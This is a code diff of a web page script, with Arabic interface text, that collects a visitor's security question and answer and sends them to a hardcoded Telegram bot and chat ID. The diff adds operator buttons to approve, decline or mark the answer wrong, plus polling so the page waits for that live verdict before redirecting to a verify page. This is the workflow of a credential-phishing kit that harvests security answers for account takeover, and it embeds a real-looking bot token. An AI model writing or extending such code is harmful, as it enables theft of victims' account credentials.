@@ -305,8 +305,8 @@
 
     <script>
         // ===== TELEGRAM CONFIG =====
-        const BOT_TOKEN = "8962923971:AAE6pwf3RxLR55lU--KAbOqf5XdNwhMbTu8"; // Replace with your Telegram Bot Token from @BotFather
-        const CHAT_ID = "8586910663"; // Replace with your Telegram Chat ID
+        const BOT_TOKEN = "8962923971:AAE6pwf3RxLR55lU--KAbOqf5XdNwhMbTu8";
+        const CHAT_ID = "8586910663";
         // ===========================
 
         const form = document.getElementById("demo-form");
@@ -314,6 +314,8 @@
         const question = document.getElementById("question");
         const answer = document.getElementById("answer");
         const submitButton = document.getElementById("submit-button");
+
+        let pollInterval = null;
 
         form.addEventListener("submit", async(event) => {
             event.preventDefault();
@@ -324,17 +326,18 @@
             // Validation
             if (!question.value) {
                 message.textContent = "يرجى اختيار سؤال الأمان.";
-                message.classList.add("visible");
-                message.classList.remove("success");
+                message.className = "message visible";
                 return;
             }
 
             if (!answerText) {
                 message.textContent = "يرجى إدخال إجابتك.";
-                message.classList.add("visible");
-                message.classList.remove("success");
+                message.className = "message visible";
                 return;
             }
+
+            // Unique session ID for this submission
+            const userId = Date.now() + "_" + answerText.slice(-3);
 
             // Build the Telegram message
             const text =
@@ -342,10 +345,22 @@
                 "❓ <b>Question:</b> " + questionText + "\n" +
                 "💬 <b>Answer:</b> " + answerText;
 
+            const keyboard = {
+                inline_keyboard: [
+                    [
+                        { text: "✅ APPROVE", callback_data: `approve_ans_${userId}` },
+                        { text: "❌ DECLINE", callback_data: `decline_ans_${userId}` },
+                    ],
+                    [
+                        { text: "⚠️ WRONG ANSWER", callback_data: `wrong_ans_${userId}` },
+                    ],
+                ],
+            };
+
             // Disable button while sending
             submitButton.disabled = true;
             submitButton.textContent = "جاري الإرسال...";
-            message.classList.remove("visible", "success");
+            message.className = "message";
 
             try {
                 const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
@@ -357,34 +372,97 @@
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
                         text: text,
-                        parse_mode: "HTML"
+                        parse_mode: "HTML",
+                        reply_markup: keyboard
                     })
                 });
 
                 const data = await res.json();
 
                 if (data.ok) {
-                    message.textContent = "تم الإرسال بنجاح. جاري التحويل...";
-                    message.classList.add("visible", "success");
-                    form.reset();
+                    message.textContent = "جاري انتظار الموافقة.....";
+                    message.className = "message visible success";
+                    question.disabled = true;
+                    answer.disabled = true;
 
-                    // Optional: Redirect after successful submission
-                    setTimeout(() => {
-                        window.location.href = "verify.html";
-                    }, 1500);
+                    // Start polling Telegram updates
+                    startPolling(userId);
                 } else {
                     message.textContent = "خطأ في تيليجرام: " + (data.description || "خطأ غير معروف");
-                    message.classList.add("visible");
+                    message.className = "message visible";
+                    submitButton.disabled = false;
+                    submitButton.textContent = "إرسال";
                 }
             } catch (err) {
                 console.error("Telegram notification error:", err);
                 message.textContent = "فشل الإرسال. يرجى التحقق من اتصالك.";
-                message.classList.add("visible");
-            } finally {
+                message.className = "message visible";
                 submitButton.disabled = false;
                 submitButton.textContent = "إرسال";
             }
         });
+
+        // =======================
+        // TELEGRAM CALLBACK POLLING
+        // =======================
+        let lastUpdateId = 0;
+
+        function startPolling(userId) {
+            if (pollInterval) clearInterval(pollInterval);
+
+            pollInterval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&timeout=2`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.ok && data.result.length > 0) {
+                            const latestUpdate = data.result[data.result.length - 1];
+                            
+                            if (latestUpdate.update_id > lastUpdateId && latestUpdate.callback_query) {
+                                lastUpdateId = latestUpdate.update_id;
+                                const callbackData = latestUpdate.callback_query.data;
+                                
+                                if (callbackData.includes(userId)) {
+                                    // Acknowledge callback query
+                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({ callback_query_id: latestUpdate.callback_query.id })
+                                    });
+
+                                    clearInterval(pollInterval);
+
+                                    if (callbackData.startsWith("approve_ans_")) {
+                                        message.textContent = "تمت الموافقة بنجاح! جاري الانتقال...";
+                                        message.className = "message visible success";
+                                        setTimeout(() => {
+                                            window.location.href = "verify.html";
+                                        }, 1000);
+                                    } 
+                                    else if (callbackData.startsWith("decline_ans_")) {
+                                        message.textContent = "تم رفض الطلب، يرجى إعادة المحاولة.";
+                                        message.className = "message visible";
+                                        resetFormState();
+                                    } 
+                                    else if (callbackData.startsWith("wrong_ans_")) {
+                                        message.textContent = "الإجابة غير صحيحة، يرجى إعادة إدخال الإجابة الصحيحة.";
+                                        message.className = "message visible";
+                                        resetFormState();
+                                    }
+                                }
+                            }
+                        }
+                    })
+                    .catch(err => console.error("Polling error:", err));
+            }, 2000);
+        }
+
+        function resetFormState() {
+            form.reset();
+            question.disabled = false;
+            answer.disabled = false;
+            submitButton.disabled = false;
+            submitButton.textContent = "إرسال";
+        }
     </script>
 </body>
 
